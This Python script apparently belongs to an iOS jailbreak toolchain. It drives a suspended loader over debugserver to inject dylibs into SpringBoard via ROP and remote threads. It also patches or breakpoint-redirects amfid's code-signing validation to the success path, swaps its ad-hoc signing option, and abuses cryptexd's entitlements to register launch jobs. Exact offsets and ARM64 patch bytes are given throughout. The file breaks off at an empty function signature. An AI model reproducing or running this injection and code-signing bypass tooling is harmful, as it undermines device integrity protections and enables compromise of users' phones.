#!/usr/bin/env python3
"""Inspect or drive one exact pre-existing suspended ptrauth loader child.

The child must be the arm64e ``codex-ellekit-loader`` spawned by the validated
resident root carrier.  PID 1 and every non-loader executable are rejected.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import re
import struct
import sys
import uuid
from pathlib import Path

from pymobiledevice3.remote.remote_service_discovery import (
    RemoteServiceDiscoveryService,
)
from pymobiledevice3.remote.rsd_tunnel import PreferredRsdTunnel

from debugserver_carrier_spawn import (
    CPU_SUBTYPE_ARM64E,
    CPU_TYPE_ARM64,
    DEBUG_PROXY_SERVICE,
    EXPECTED_CARRIER_UUID,
    GDBRemote,
    LC_UUID,
    MAX_LOAD_COMMAND_BYTES,
    MAX_LOAD_COMMANDS,
    MH_EXECUTE,
    MH_MAGIC_64,
    ProtocolError,
    StopState,
    allocate_scratch,
    expect_ok,
    find_inventory_images,
    frame_packet,
    parse_key_values,
    read_register,
    read_memory,
    set_register,
    write_memory,
)


LOADER_SUFFIX = "/procursus/usr/libexec/codex-ellekit-loader"
SPRINGBOARD_PATH = "/System/Library/CoreServices/SpringBoard.app/SpringBoard"
RESIDENT_HOOK_PATH = (
    "/var/jb/usr/lib/codex-dyld-jb-admission-hook.dylib"
)
RESIDENT_CANARY_PATH = (
    "/var/jb/usr/lib/codex-springboard-live-canary.dylib"
)
EXEC_CANDIDATE_TRACE_PROBE_PATH = (
    "/private/var/mobile/Media/codex-exec-candidate-trace-probe.dylib"
)
EXEC_CANDIDATE_TRACE_PROBE_SYMBOL = (
    "_codex_exec_cs_persistence_probe_start_async"
)
AMFID_PATH = "/usr/libexec/amfid"
CRYPTEXD_PATH = "/usr/libexec/cryptexd"
CRYPTEXD_UUID = uuid.UUID("261f91f3-7016-35a2-9a84-c85d2b6a834e")
CRYPTEXD_LAUNCH_TYPE1_COPIED_PLIST = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.openai.codex.launch-type-canary</string>
<key>ProgramArguments</key><array>
<string>/var/jb/usr/libexec/codex-xpcproxy-launch-canary</string>
<string>com.openai.codex.invalid-canary-service</string>
</array>
<key>_LaunchType</key><integer>1</integer>
</dict></plist>"""
CRYPTEXD_LAUNCH_TYPE1_ORIGINAL_PLIST = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.openai.codex.launch-type-canary</string>
<key>ProgramArguments</key><array>
<string>/usr/libexec/xpcproxy</string>
<string>com.openai.codex.invalid-canary-service</string>
</array>
<key>_LaunchType</key><integer>1</integer>
</dict></plist>"""
CRYPTEXD_SESSION_NAME = "com.openai.codex.launch-type1-probe"
CRYPTEXD_SPRINGBOARD_CANDIDATE_LABEL = (
    "com.openai.codex.springboard-live-candidate"
)
CRYPTEXD_SPRINGBOARD_CANDIDATE_PROGRAM = (
    "/var/jb/usr/libexec/codex-springboard-candidate/"
    "SpringBoard.app/SpringBoard"
)
CRYPTEXD_SPRINGBOARD_CANDIDATE_SESSION_NAME = (
    "com.openai.codex.springboard-live-proof"
)
CRYPTEXD_SPRINGBOARD_CANDIDATE_PLIST = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>{CRYPTEXD_SPRINGBOARD_CANDIDATE_LABEL}</string>
<key>Program</key><string>{CRYPTEXD_SPRINGBOARD_CANDIDATE_PROGRAM}</string>
<key>UserName</key><string>mobile</string>
<key>POSIXSpawnType</key><string>App</string>
<key>CFBundleIdentifier</key><string>com.apple.springboard</string>
<key>_LaunchType</key><integer>1</integer>
</dict></plist>"""
CRYPTEXD_SEALED_SPRINGBOARD_LABEL = (
    "com.openai.codex.springboard-sealed-admission-24a437"
)
CRYPTEXD_SEALED_SPRINGBOARD_PROGRAM = (
    "/System/Library/CoreServices/SpringBoard.app/SpringBoard"
)
CRYPTEXD_SEALED_SPRINGBOARD_SESSION_NAME = (
    "com.openai.codex.springboard-sealed-admission-session-24a437"
)
CRYPTEXD_SEALED_SPRINGBOARD_PLIST = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>{CRYPTEXD_SEALED_SPRINGBOARD_LABEL}</string>
<key>Program</key><string>{CRYPTEXD_SEALED_SPRINGBOARD_PROGRAM}</string>
<key>UserName</key><string>mobile</string>
<key>POSIXSpawnType</key><string>App</string>
<key>CFBundleIdentifier</key><string>com.apple.springboard</string>
<key>_LaunchType</key><integer>1</integer>
</dict></plist>"""
CRYPTEXD_LAUNCHD_SESSION_CREATE_JOB_OFFSET = 0x4A7E8
CRYPTEXD_XPC_CREATE_FROM_PLIST_OFFSET = 0x6D754
CRYPTEXD_XPC_RELEASE_OFFSET = 0x6D974
CRYPTEXD_POOL_POP_OFFSET = 0x6CBC4
CRYPTEXD_POOL_PUSH_OFFSET = 0x6CBD4
CRYPTEXD_NSARRAY_ONE_OBJECT_OFFSET = 0x6DCE0
CRYPTEXD_SUBMIT_ALL_OFFSET = 0x6EFC0
CRYPTEXD_NSARRAY_CLASS_SLOT_OFFSET = 0x8CDE0
CRYPTEXD_OSLAUNCHDJOB_CLASS_SLOT_OFFSET = 0x8CFB8
CRYPTEXD_EXPECTED_CODE = {
    CRYPTEXD_LAUNCHD_SESSION_CREATE_JOB_OFFSET: bytes.fromhex(
        "7f2303d5ff4302d1fa6704a9f85f05a9"
        "f65706a9f44f07a9fd7b08a9fd030291"
    ),
    CRYPTEXD_XPC_CREATE_FROM_PLIST_OFFSET: bytes.fromhex(
        "f10000f031a22791300240f9110a1fd7"
    ),
    CRYPTEXD_XPC_RELEASE_OFFSET: bytes.fromhex(
        "f10000f031e22b91300240f9110a1fd7"
    ),
    CRYPTEXD_POOL_POP_OFFSET: bytes.fromhex(
        "f10000f031423591300240f9110a1fd7"
    ),
    CRYPTEXD_POOL_PUSH_OFFSET: bytes.fromhex(
        "f10000f031623591300240f9110a1fd7"
    ),
    CRYPTEXD_NSARRAY_ONE_OBJECT_OFFSET: bytes.fromhex(
        "2101009021e842f9f10000d031823691"
        "300240f9110a1fd7"
    ),
    CRYPTEXD_SUBMIT_ALL_OFFSET: bytes.fromhex(
        "010100f0214445f9f10000b031823691"
        "300240f9110a1fd7"
    ),
}
AMFID_ADMISSION_CANARY_PATH = (
    "/var/jb/usr/libexec/codex-amfid-admission-canary"
)
AMFID_ADMISSION_CANARY_CDHASH = bytes.fromhex(
    "281fa21cf9166a0c40873cc8d4d49c3405dc3a3a"
)
AMFI_FRAMEWORK_PATH = (
    "/System/Library/PrivateFrameworks/AppleMobileFileIntegrity.framework/"
    "AppleMobileFileIntegrity"
)
LIBMIS_PATH = "/usr/lib/libmis.dylib"
LIBDYLD_PATH = "/usr/lib/system/libdyld.dylib"
LIBDYLD_WRITABLE_TPRO_CALL_OFFSET = 0x2404
LIBDYLD_WRITABLE_TPRO_CALL_ORIGINAL = bytes.fromhex(
    # mov x2,x1; mov x1,x0; adrp x9,...; ldr x8,[x9,...]; cmn x8,#1
    "e20301aae10300aa69d531b0281d46f91f0500b1"
)
LIBDYLD_LAZY_LOAD_OFFSET = 0x3634
LIBDYLD_LAZY_LOAD_ORIGINAL = bytes.fromhex(
    # pacibsp; save x14-x15, x12-x13, x10-x11, x8-x9, x6-x7
    "7f2303d5ee3fbfa9ec37bfa9ea2fbfa9e827bfa9e61fbfa9"
)
DYLD_TPRO_QWORD_STORE_CALLBACK_OFFSET = 0x659C8
DYLD_TPRO_QWORD_STORE_CALLBACK_ORIGINAL = bytes.fromhex(
    # ldp x9,x8,[x0,#0x20]; ldr x8,[x8]; ldr x9,[x9]; str x8,[x9]; ret
    "092042a9080140f9290140f9280100f9c0035fd6"
)
AMFI_VALIDATE_OPTION_LOAD_OFFSET = 0x2920
AMFI_VALIDATE_OPTION_LOAD_ORIGINAL = bytes.fromhex(
    # Runtime shared-cache encoding after dyld adjusts the ADRP to the slid
    # RespectUpp GOT page; followed by ldr x8, [x8, #0x258]; ldr x3, [x8].
    "a8b60990082d41f9030140f9"
)
# Exact 24A435 shared-cache offset from the AMFI framework Mach-O header to
# the GOT slot used by -[AMFIPathValidator_ios validateWithError:] for
# kMISValidationOptionRespectUppTrustAndAuthorization.
AMFI_RESPECT_UPP_GOT_OFFSET = 0x136D6258
AMFI_VALIDATE_BRANCH_OFFSET = 0x29DC
AMFI_VALIDATE_CONTEXT_OFFSET = 0x29D8
AMFI_VALIDATE_SUCCESS_OFFSET = 0x2A50
AMFI_VALIDATE_CONTEXT_ORIGINAL = bytes.fromhex(
    "fb4b0ad0b9030034f80317aaf70315aa"
)
AMFI_VALIDATE_SUCCESS_ORIGINAL = bytes.fromhex(
    "b60200b4970200b4de78d894882240f9"
    "972200f9a378d894a8b60990082941f9"
)
AMFI_VALIDATE_BRANCH_PATCHED = bytes.fromhex("1d000014")
MACH_TASK_SELF_GOT_OFFSET = 0x144D0
MAIN_OFFSET = 0x4000
SOFTEN_TARGET_OFFSET = 0x4E08
KILL_STUB_OFFSET = 0xB258
MACH_PORT_DEALLOCATE_STUB_OFFSET = 0xB278
MACH_VM_DEALLOCATE_STUB_OFFSET = 0xB298
MACH_VM_PROTECT_STUB_OFFSET = 0xB2A8
MACH_VM_REMAP_STUB_OFFSET = 0xB2C8
PROC_PIDPATH_STUB_OFFSET = 0xB3D8
TASK_FOR_PID_STUB_OFFSET = 0xB4A8
TASK_INFO_STUB_OFFSET = 0xB4B8
TASK_THREADS_STUB_OFFSET = 0xB4C8
THREAD_GET_STATE_STUB_OFFSET = 0xB4F8
THREAD_TERMINATE_STUB_OFFSET = 0xB548
TASK_READ_OFFSET = 0xAB78
TASK_WRITE_OFFSET = 0xACD8
GET_REMOTE_IMAGE_ADDRESS_OFFSET = 0x6C30
REMOTE_DLSYM_OFFSET = 0x7800
REMOTE_DLSYM_FIND_IMAGE_OFFSET = 0x797C
WRITE_STRING_TO_TASK_OFFSET = 0x8704
CREATE_REMOTE_PTHREAD_OFFSET = 0x8918
MAKE_SYM_CALLABLE_OFFSET = 0x9004
ARB_CALL_OFFSET = 0x902C
PREPARE_FOR_MAGIC_OFFSET = 0x998C
INJECT_DYLIB_VIA_ROP_OFFSET = 0x9F24
REALPATH_STUB_OFFSET = 0xB3F8
MAKE_SYM_CALLABLE_PROLOGUE = bytes.fromhex(
    "ff4300d1e00700f9e80740f9"
)
THREAD_STATE_PC_SIGNER_PATCH = bytes.fromhex(
    # xpaci x0; pacia x0, x1; ret
    "e043c1da2000c1dac0035fd6"
)
ARM64_NOP = bytes.fromhex("1f2003d5")
ARB_CALL_THREAD_QUIESCE_PATCHES = {
    # A remote Objective-C/JSC call can depend on SpringBoard's existing
    # runtime threads.  The inherited injector suspends them around every
    # arbCall, which deadlocks JSContext initialization.  Patch only the
    # helper's three balanced suspend/resume call sites for the bounded JSC
    # probe; the original instructions are restored before detach.
    0x9714: bytes.fromhex("10040094"),
    0x97A4: bytes.fromhex("0f040094"),
    0x98A8: bytes.fromhex("ce030094"),
}
ARB_CALL_NATIVE_PTHREAD_STACK_PATCHES = {
    # arbCall normally points the target SP at the middle of a fresh anonymous
    # VM allocation.  JavaScriptCore validates the current SP against the
    # pthread's registered stack range and intentionally traps when those do
    # not match.  On the dedicated, idle pthread only, use its exact saved
    # native SP.  New AArch64 call frames grow below the dormant thread_start
    # frame, and arbCall restores the complete original state afterward.  The
    # original instructions are restored on detach.
    0x92C8: (
        bytes.fromhex("4a0140f9"),  # ldr x10, [x10]
        # x9 points at arbCall's 8-byte state wrapper; the saved ARM64 SP is
        # wrapper + 8 + ARM_THREAD_STATE64_SP_OFFSET == wrapper + 0x100.
        bytes.fromhex("2a8140f9"),  # ldr x10, [x9, #0x100]
    ),
    0x92CC: (
        bytes.fromhex("4a214091"),  # add x10, x10, #0x8000
        # The saved opaque SP is already data-PAC-signed.  arbCall's existing
        # arm_thread_state64_set_sp sequence signs its input, so strip the
        # saved signature first to avoid producing a double-signed SP.
        bytes.fromhex("ea47c1da"),  # xpacd x10
    ),
}
USE_EXPERIMENTAL_BORROWED_JSC_THREAD = False

EXPECTED_LOADER_CODE = {
    MAIN_OFFSET: bytes.fromhex("7f2303d5fc6fbea9fd7b01a9fd430091"),
    SOFTEN_TARGET_OFFSET: bytes.fromhex(
        "7f2303d5fc6fbea9fd7b01a9fd430091"
    ),
    GET_REMOTE_IMAGE_ADDRESS_OFFSET: bytes.fromhex(
        "7f2303d5ff4302d1fd7b08a9fd030291"
    ),
    REMOTE_DLSYM_OFFSET: bytes.fromhex(
        "7f2303d5ff4302d1fd7b08a9fd030291"
    ),
    REMOTE_DLSYM_FIND_IMAGE_OFFSET: bytes.fromhex(
        "7f2303d5ffc303d1fd7b0ea9fd830391"
    ),
    WRITE_STRING_TO_TASK_OFFSET: bytes.fromhex(
        "7f2303d5ff0302d1fd7b07a9fdc30191"
    ),
    CREATE_REMOTE_PTHREAD_OFFSET: bytes.fromhex(
        "7f2303d5fc6fbea9fd7b01a9fd430091"
    ),
    MAKE_SYM_CALLABLE_OFFSET: bytes.fromhex(
        "ff4300d1e00700f9e80740f9e843c1da"
    ),
    ARB_CALL_OFFSET: bytes.fromhex(
        "7f2303d5fc6fbea9fd7b01a9fd430091"
    ),
    PREPARE_FOR_MAGIC_OFFSET: bytes.fromhex(
        "7f2303d5ffc301d1fd7b06a9fd830191"
    ),
    INJECT_DYLIB_VIA_ROP_OFFSET: bytes.fromhex(
        "7f2303d5ff0302d1fd7b07a9fdc30191"
    ),
    KILL_STUB_OFFSET: bytes.fromhex(
        "510000b031620b91300240f9110a1fd7"
    ),
    MACH_PORT_DEALLOCATE_STUB_OFFSET: bytes.fromhex(
        "510000b031a20b91300240f9110a1fd7"
    ),
    MACH_VM_DEALLOCATE_STUB_OFFSET: bytes.fromhex(
        "510000b031e20b91300240f9110a1fd7"
    ),
    MACH_VM_PROTECT_STUB_OFFSET: bytes.fromhex(
        "510000b031020c91300240f9110a1fd7"
    ),
    MACH_VM_REMAP_STUB_OFFSET: bytes.fromhex(
        "510000b031420c91300240f9110a1fd7"
    ),
    PROC_PIDPATH_STUB_OFFSET: bytes.fromhex(
        "510000b031020e91300240f9110a1fd7"
    ),
    REALPATH_STUB_OFFSET: bytes.fromhex(
        "510000b031420e91300240f9110a1fd7"
    ),
    TASK_FOR_PID_STUB_OFFSET: bytes.fromhex(
        "510000b031a20f91300240f9110a1fd7"
    ),
    TASK_INFO_STUB_OFFSET: bytes.fromhex(
        "510000b031c20f91300240f9110a1fd7"
    ),
    TASK_THREADS_STUB_OFFSET: bytes.fromhex(
        "510000b031e20f91300240f9110a1fd7"
    ),
    THREAD_GET_STATE_STUB_OFFSET: bytes.fromhex(
        "510000b031421091300240f9110a1fd7"
    ),
    THREAD_TERMINATE_STUB_OFFSET: bytes.fromhex(
        "510000b031e21091300240f9110a1fd7"
    ),
    TASK_READ_OFFSET: bytes.fromhex(
        "7f2303d5ff4301d1fd7b04a9fd030191"
    ),
    TASK_WRITE_OFFSET: bytes.fromhex(
        "7f2303d5ffc300d1fd7b02a9fd830091"
    ),
}
EXPECTED_LOADER_CODE.update(ARB_CALL_THREAD_QUIESCE_PATCHES)
EXPECTED_LOADER_CODE.update(
    {
        offset: original
        for offset, (original, _replacement) in (
            ARB_CALL_NATIVE_PTHREAD_STACK_PATCHES.items()
        )
    }
)

TASK_DYLD_INFO = 17
TASK_DYLD_INFO_COUNT = 6
PATH_BUFFER_OFFSET = 0x000
PATH_BUFFER_SIZE = 0x400
TASK_PORT_OFFSET = 0x400
DYLD_INFO_OFFSET = 0x408
DYLD_INFO_COUNT_OFFSET = 0x420
REMOTE_THREAD_OFFSET = 0x428
CALL_RETURN_OFFSET = 0x430
LIBSYSTEM_PATH_OFFSET = 0x500
GETPID_SYMBOL_OFFSET = 0x580
REMOTE_SIZE_OFFSET = 0x588
LOCAL_STRING_OFFSET = 0x600
LOCAL_STRING_SIZE = 0x400
DONOR_TASK_PORT_OFFSET = 0x640
DONOR_REMAP_ADDRESS_OFFSET = 0x648
DONOR_CURRENT_PROTECTION_OFFSET = 0x650
DONOR_MAXIMUM_PROTECTION_OFFSET = 0x654
LOCAL_DYLD_INFO_OFFSET = 0xA00
LOCAL_DYLD_COUNT_OFFSET = 0xA18
REGION_ADDRESS_OFFSET = 0xA20
REGION_SIZE_OFFSET = 0xA28
REGION_DEPTH_OFFSET = 0xA30
REGION_INFO_OFFSET = 0xA38
REGION_COUNT_OFFSET = 0xA90
THREAD_ARRAY_OFFSET = 0x440
THREAD_COUNT_OFFSET = 0x448
THREAD_STATE_OFFSET = 0x500
THREAD_STATE_COUNT_OFFSET = 0x620
ARM_THREAD_STATE64 = 6
ARM_THREAD_STATE64_COUNT = 68
ARM_THREAD_STATE64_SP_OFFSET = 0xF8
ARM_THREAD_STATE64_PC_OFFSET = 0x100
ARM_THREAD_STATE64_FLAGS_OFFSET = 0x10C
ARM_THREAD_STATE64_X20_OFFSET = 20 * 8
ARM_THREAD_STATE64_X23_OFFSET = 23 * 8
ARM_THREAD_STATE64_X25_OFFSET = 25 * 8
ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH = 0x1
ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC = 0x4
ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK = 0xFF000000
ARM_THREAD_STATE64_PC_STRING_DISCRIMINATOR = 0x7481
ARM_DEBUG_STATE64 = 15
ARM_DEBUG_STATE64_COUNT = 130
ARM_DEBUG_STATE64_SIZE = ARM_DEBUG_STATE64_COUNT * 4
ARM_DEBUG_STATE64_BVR0_OFFSET = 0
ARM_DEBUG_STATE64_BCR0_OFFSET = 16 * 8
ARM_DEBUG_STATE64_WCR0_OFFSET = 48 * 8
ARM_DEBUG_STATE64_MDSCR_OFFSET = 64 * 8
ARM_DEBUG_BREAKPOINT_CONTROL = 0x1E7
ARM_DEBUG_THREAD_BREAKPOINT_CONTROL = 0x1E5
AMFID_DEBUG_STATE_OFFSET = 0xB00
AMFID_DEBUG_STATE_COUNT_OFFSET = 0xD10
AMFID_EXCEPTION_MASKS_OFFSET = 0xD20
AMFID_EXCEPTION_HANDLERS_OFFSET = 0xDA0
AMFID_EXCEPTION_BEHAVIORS_OFFSET = 0xE20
AMFID_EXCEPTION_FLAVORS_OFFSET = 0xEA0
AMFID_EXCEPTION_COUNT_OFFSET = 0xF20
EXC_MASK_BREAKPOINT = 1 << 6
EXCEPTION_STATE = 2
EXCEPTION_STATE_IDENTITY_PROTECTED = 5
MACH_EXCEPTION_CODES = 0x80000000
MACH_PORT_RIGHT_RECEIVE = 1
MACH_MSG_TYPE_MAKE_SEND = 20
MACH_MSG_TYPE_MOVE_SEND_ONCE = 18
MACH_MSGH_BITS_COMPLEX = 0x80000000
MACH_RCV_MSG = 0x2
MACH_RCV_TIMEOUT = 0x100
MACH_RCV_VOUCHER = 0x800
MACH_SEND_MSG = 0x1
MACH_SEND_TIMEOUT = 0x10
MACH_EXCEPTION_REQUEST_ID = 2410
MACH_EXCEPTION_REPLY_ID = 2510
MACH_EXCEPTION_STATE_REQUEST_ID = 2406
MACH_EXCEPTION_STATE_REPLY_ID = 2506
MACH_EXCEPTION_BUFFER_OFFSET = 0x000
MACH_EXCEPTION_BUFFER_SIZE = 0x600
MACH_EXCEPTION_REPLY_OFFSET = 0x600
MACH_EXCEPTION_REPLY_CAPACITY = 0x400
ROP_LOOP_STORAGE_OFFSET = 0x18000
USER_VA_MASK = 0x0000007FFFFFFFFF
REMOTE_THREAD_STACK_SIZE = 65536
STACK_BACKUP_SIZE = 0x40
RTLD_NOW_LOCAL = 0x6
JSC_FRAMEWORK_PATH = (
    "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"
)
DONOR_WORKER_SUFFIX = "/procursus/usr/libexec/codex-exec-worker"
DONOR_PAGE_SIZE = 0x4000
DONOR_ENTRY_OFFSET = 0x10
DONOR_PROBE_PREFIX = bytes.fromhex(
    # Entry zero keeps the worker's owned child alive in a low-power loop.
    # Entry 0x10 is the only code called in SpringBoard: bti c; return 42.
    "5f2403d55f2003d5ffffff171f2003d5"
    "5f2403d540058052c0035fd61f2003d5"
)
VM_FLAGS_ANYWHERE = 1
VM_FLAGS_FIXED = 0
VM_INHERIT_NONE = 2
VM_PROT_READ = 1
VM_PROT_WRITE = 2
VM_PROT_EXECUTE = 4
VM_PROT_COPY = 0x10
SIGKILL = 9
VM_REGION_SUBMAP_INFO_COUNT_64 = 21
VM_REGION_SUBMAP_INFO_SIZE_64 = 84
VM_REGION_SUBMAP_INFO_IS_SUBMAP_OFFSET = 48
VM_REGION_SUBMAP_INFO_FLAGS_OFFSET = 62
VM_REGION_FLAG_TPRO_ENABLED = 0x2
DONOR_REGION_SCAN_LIMIT = 2048
KERN_INVALID_ADDRESS = 1
LC_LAZY_LOAD_DYLIB_INFO = 0x3A
LC_SEGMENT_64 = 0x19
DYLD_CHAINED_PTR_32 = 3
MH_DYLIB = 6
AMFID_LAZY_DATA_OFFSET = 0x100
AMFID_LAZY_FLAG_OFFSET = 0xE0
AMFID_LAZY_PATH_OFFSET = 0x20
AMFID_LAZY_ALLOW_SYMBOL_OFFSET = 0x40
AMFID_LAZY_RESPECT_SYMBOL_OFFSET = 0x80
AMFID_LAZY_SYMBOL_ARRAY_OFFSET = 0x100
AMFID_LAZY_CONTROL_SYMBOL_ARRAY_OFFSET = 0xC0
AMFID_LAZY_CONTROL_CHAIN_OFFSET = 0xD0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    parser.add_argument(
        "--userspace-udid",
        help=(
            "establish a no-root in-process USB tunnel for this UDID; "
            "host and port are ignored"
        ),
    )
    parser.add_argument("--pid", required=True, type=int)
    parser.add_argument("--expected-parent", required=True, type=int)
    parser.add_argument("--timeout", type=float, default=20.0)
    modes = parser.add_mutually_exclusive_group(required=True)
    modes.add_argument(
        "--inspect-only",
        action="store_true",
        help="validate the suspended loader state and detach",
    )
    modes.add_argument(
        "--run-exec-candidate-trace-probe",
        action="store_true",
        help=(
            "load and start the fixed disposable traced-exec candidate "
            "probe inside the exact trusted loader"
        ),
    )
    modes.add_argument(
        "--thread-probe",
        metavar="SPRINGBOARD_PID",
        type=int,
        help=(
            "create one loader-controlled SpringBoard pthread and call only "
            "the existing signed getpid function"
        ),
    )
    modes.add_argument(
        "--resident-inject-hook",
        metavar="SPRINGBOARD_PID",
        type=int,
        help=(
            "load the fixed jailbreak admission hook into SpringBoard and "
            "retain its dlopen handle for the process lifetime"
        ),
    )
    modes.add_argument(
        "--resident-inject-canary",
        metavar="SPRINGBOARD_PID",
        type=int,
        help=(
            "load the fixed live canary into SpringBoard and retain its "
            "dlopen handle for the process lifetime"
        ),
    )
    modes.add_argument(
        "--jsc-probe",
        metavar="SPRINGBOARD_PID",
        type=int,
        help=(
            "use the trusted ptrauth loader lane to evaluate only '40 + 2' "
            "inside SpringBoard's Apple JavaScriptCore framework"
        ),
    )
    modes.add_argument(
        "--donor-remap-probe",
        metavar="SPRINGBOARD_PID",
        type=int,
        help=(
            "remap one validated anonymous RX page from an exact "
            "codex-exec-worker child into SpringBoard and call only its "
            "fixed return-42 entry"
        ),
    )
    modes.add_argument(
        "--cleanup-rop-thread",
        metavar="SPRINGBOARD_PID",
        type=int,
        help=(
            "terminate exactly one orphan helper thread whose PC equals the "
            "loader's validated SpringBoard ROP loop"
        ),
    )
    modes.add_argument(
        "--amfid-policy-probe",
        metavar="AMFID_PID",
        type=int,
        help=(
            "temporarily replace only AMFIPathValidator_ios validation "
            "and validity methods with an existing signed getpid IMP, "
            "then restore"
        ),
    )
    modes.add_argument(
        "--amfid-method-inventory",
        metavar="AMFID_PID",
        type=int,
        help=(
            "read and print the AMFIPathValidator_ios instance-method "
            "inventory without modifying amfid"
        ),
    )
    modes.add_argument(
        "--amfid-mis-branch-probe",
        metavar="AMFID_PID",
        type=int,
        help=(
            "temporarily route the exact AMFIPathValidator_ios MIS-error "
            "branch through its existing cdhash-processing path, then "
            "restore the original instruction"
        ),
    )
    modes.add_argument(
        "--amfid-adhoc-option-probe",
        metavar="AMFID_PID",
        type=int,
        help=(
            "temporarily substitute the exact AMFI validator's libmis "
            "RespectUpp option pointer with AllowAdHocSigning, run only "
            "the fixed admission canary, and restore the original pointer"
        ),
    )
    modes.add_argument(
        "--amfid-adhoc-option-inspect",
        metavar="AMFID_PID",
        type=int,
        help=(
            "resolve and read the exact AMFI validator's libmis option "
            "pointer without modifying amfid"
        ),
    )
    modes.add_argument(
        "--amfid-lazy-load-preflight",
        metavar="AMFID_PID",
        type=int,
        help=(
            "stage and verify a synthetic iOS 27 dyld lazy-load descriptor "
            "for the exact AMFI option GOT, then deallocate it without "
            "calling dyld or modifying the GOT"
        ),
    )
    modes.add_argument(
        "--amfid-debug-state-preflight",
        metavar="AMFID_PID",
        type=int,
        help=(
            "while the exact amfid task is suspended, arm and immediately "
            "restore its task/thread hardware-breakpoint state without "
            "letting any target instruction execute"
        ),
    )
    modes.add_argument(
        "--amfid-hwbp-redirect-probe",
        metavar="AMFID_PID",
        type=int,
        help=(
            "handle one exact AMFI validation hardware breakpoint and "
            "redirect it to the framework's existing metadata-preserving "
            "success block, then restore every debug/exception state"
        ),
    )
    parser.add_argument(
        "--amfid-state-only-control",
        action="store_true",
        help=(
            "with --amfid-hwbp-redirect-probe, use ordinary "
            "EXCEPTION_STATE and return the received state byte-for-byte; "
            "never redirect the trapped PC"
        ),
    )
    parser.add_argument(
        "--amfid-state-advance-control",
        action="store_true",
        help=(
            "with --amfid-state-only-control, return a signed PC at the "
            "validated MIS-error branch successor (PC+4) while preserving "
            "the original error path"
        ),
    )
    modes.add_argument(
        "--amfid-restart-recovery",
        metavar="AMFID_PID",
        type=int,
        help=(
            "terminate only an exact validated amfid PID so launchd can "
            "recreate its pristine shared-cache mappings after a failed "
            "reversible code-page experiment"
        ),
    )
    modes.add_argument(
        "--cryptexd-launch-type1-register",
        metavar="CRYPTEXD_PID",
        type=int,
        help=(
            "use the exact stock cryptexd entitlement context to register "
            "one fixed dormant launch-type-1 job"
        ),
    )
    cryptexd_jobs = parser.add_mutually_exclusive_group()
    cryptexd_jobs.add_argument(
        "--cryptexd-original-xpcproxy-control",
        action="store_true",
        help=(
            "with --cryptexd-launch-type1-register, use the immutable "
            "original /usr/libexec/xpcproxy vnode instead of the copied "
            "canary; the invalid service argument remains inert"
        ),
    )
    cryptexd_jobs.add_argument(
        "--cryptexd-springboard-candidate-job",
        action="store_true",
        help=(
            "with --cryptexd-launch-type1-register, register only the fixed "
            "dormant SpringBoard candidate job; it omits RunAtLoad and "
            "KeepAlive"
        ),
    )
    cryptexd_jobs.add_argument(
        "--cryptexd-sealed-springboard-job",
        action="store_true",
        help=(
            "with --cryptexd-launch-type1-register, register only the fixed "
            "dormant canonical sealed system SpringBoard job; it omits "
            "RunAtLoad and KeepAlive"
        ),
    )
    parser.add_argument(
        "--amfid-policy-hold-seconds",
        type=float,
        default=15.0,
        help="bounded interval to keep the AMFI accessor swizzle active",
    )
    parser.add_argument(
        "--donor-pid",
        type=int,
        help="exact owned codex-exec-worker child that holds the RX page",
    )
    parser.add_argument(
        "--donor-address",
        type=lambda value: int(value, 0),
        help="page-aligned anonymous RX source address in the donor child",
    )
    return parser.parse_args()


def decode_process_name(value: str) -> str:
    if not value:
        return ""
    try:
        return bytes.fromhex(value).decode("utf-8", "replace")
    except ValueError:
        return value


async def validate_loader_image(
    remote: GDBRemote, image_base: int
) -> uuid.UUID:
    header = await read_memory(remote, image_base, 32)
    (
        magic,
        cpu_type,
        cpu_subtype,
        file_type,
        command_count,
        command_bytes,
        _flags,
        _reserved,
    ) = struct.unpack("<IiiIIIII", header)
    if magic != MH_MAGIC_64 or cpu_type != CPU_TYPE_ARM64:
        raise ProtocolError("loader child has an invalid Mach-O header")
    if (cpu_subtype & 0x00FFFFFF) != CPU_SUBTYPE_ARM64E:
        raise ProtocolError(
            f"loader child is not arm64e: subtype=0x{cpu_subtype:x}"
        )
    if file_type != MH_EXECUTE:
        raise ProtocolError(f"loader child is not MH_EXECUTE: {file_type}")
    if not (0 < command_count <= MAX_LOAD_COMMANDS) or not (
        0 < command_bytes <= MAX_LOAD_COMMAND_BYTES
    ):
        raise ProtocolError("loader child has invalid load-command bounds")
    commands = await read_memory(remote, image_base + 32, command_bytes)
    cursor = 0
    observed_uuid: uuid.UUID | None = None
    for _ in range(command_count):
        if cursor + 8 > len(commands):
            raise ProtocolError("loader child load commands are truncated")
        command, command_size = struct.unpack_from("<II", commands, cursor)
        if command_size < 8 or cursor + command_size > len(commands):
            raise ProtocolError("loader child has an invalid load command")
        if command == LC_UUID:
            if command_size != 24 or observed_uuid is not None:
                raise ProtocolError("loader child has invalid UUID commands")
            observed_uuid = uuid.UUID(
                bytes=commands[cursor + 8 : cursor + 24]
            )
        cursor += command_size
    if cursor != len(commands) or observed_uuid != EXPECTED_CARRIER_UUID:
        raise ProtocolError(
            f"loader child UUID mismatch: {observed_uuid}"
        )
    return observed_uuid


async def validate_loader_code(remote: GDBRemote, image_base: int) -> None:
